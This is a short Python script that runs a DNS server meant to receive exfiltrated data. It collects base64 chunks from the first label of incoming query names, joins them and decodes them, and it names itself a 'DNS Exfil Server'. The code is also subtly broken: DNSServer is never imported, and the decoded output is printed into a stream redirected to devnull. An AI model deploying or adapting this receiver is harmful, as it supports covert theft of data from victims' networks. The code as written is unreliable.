from dnslib.server import BaseResolver
from dnslib import DNSRecord, RR, A
import base64
import os
import sys
import contextlib

class ExfilResolver(BaseResolver):
    def __init__(self):
        self.chunks = []

    def resolve(self, request, handler):
        qname = str(request.q.qname)
        cleaned = qname.rstrip(".")
        parts = cleaned.split(".")

        if len(parts) < 1:
            return request.reply()

        chunk_data = parts[0]
        self.chunks.append(chunk_data)
        full_encoded = "".join(self.chunks)

        with open(os.devnull, 'w') as devnull:
            with contextlib.redirect_stdout(devnull), contextlib.redirect_stderr(devnull):
                try:
                    message = base64.b64decode(full_encoded).decode()
                    print(f"Decoded message: {message}")
                    self.chunks = []  
                except Exception:
                    pass  

        reply = request.reply()
        reply.add_answer(RR(rname=qname, rtype="A", rclass=1, ttl=60, rdata=A("127.0.0.1")))
        return reply

if __name__ == "__main__":
    resolver = ExfilResolver()
    server = DNSServer(resolver, port=53, address="0.0.0.0")
    print("[*] DNS Exfil Server is running on UDP port 53...")
    server.start()
